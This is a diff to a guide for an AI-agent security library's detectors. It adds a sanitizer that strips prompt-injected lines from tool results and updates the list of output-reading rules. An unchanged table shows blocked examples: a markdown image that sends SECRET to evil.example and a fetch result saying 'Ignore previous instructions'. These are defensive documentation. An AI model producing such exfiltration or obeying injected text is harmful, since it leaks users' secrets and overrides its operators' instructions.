@@ -1,6 +1,6 @@
 # Using detectors
 
-Detectors are ready-made rules, one per kind of attack. interlock ships 121 detectors:
+Detectors are ready-made rules, one per kind of attack. interlock ships 122 detectors:
 prompt-injection signatures, SQL injection, secret and PII redaction,
 egress allowlists, SSRF checks, loop and budget limits, MCP trust checks, and
 more. This guide shows how to pick them, how to avoid the one mistake that makes
@@ -202,6 +202,12 @@ BROWSING_RULES = [
 | `fetch(url="http://10.0.0.5/admin")` | blocked: private |
 | `respond(text="![x](https://evil.example/p.png?data=SECRET)")` | blocked: `markdown_image_exfil` |
 | a `fetch` result saying "Ignore previous instructions..." | blocked: `tool_result_injection` |
+
+`tool_result_injection_guard` withholds the whole result. Swap in
+`tool_result_injection_sanitizer` when one poisoned line should not cost the
+whole page: it replaces the injected sentence with a marker and delivers the
+rest. Install one or the other - with both, the blocking rule fires first and
+the rewrite never runs.
 
 If the agent should only reach known sites, add
 `network_egress_guard(allowed_hosts=[...])` first. An allowlist doesn't depend on
@@ -481,16 +487,19 @@ apply.
   but not `?d=`. Allowlists (`network_egress_guard`, `tool_allowlist`,
   `rag_source_allowlist`) don't have this weakness, so lean on them where you
   can.
-- **Most check calls, not results.** Only `tool_result_injection_guard` reads
-  tool output. To scan output for secrets or PII, write a
-  [result rule](writing-rules.md#check-results).
+- **Most check calls, not results.** Six rules read tool output:
+  `tool_result_injection_guard` (withholds a poisoned result),
+  `tool_result_injection_sanitizer` (removes the poisoned lines, delivers the
+  rest), `tool_output_secret_redactor`, `data_masking_guard`,
+  `http_status_guard` and `result_size_guard`. To scan output for anything
+  else, write a [result rule](writing-rules.md#check-results).
 - **Stateful detectors count per process.** Rate limiters, budgets, and loop
   guards keep their counts in memory. Each new process (or each new factory call)
   starts from zero.
 
 ## Next
 
-- [Detector catalog](../reference/detectors.md): all 121 detectors, grouped, with scope
+- [Detector catalog](../reference/detectors.md): all 122 detectors, grouped, with scope
   and parameters.
 - [Writing rules](writing-rules.md): for anything a detector doesn't cover.
 - [Adding a detector](https://github.com/SourceShift/InterLock/blob/main/CONTRIBUTING.md#adding-a-detector): contributing a
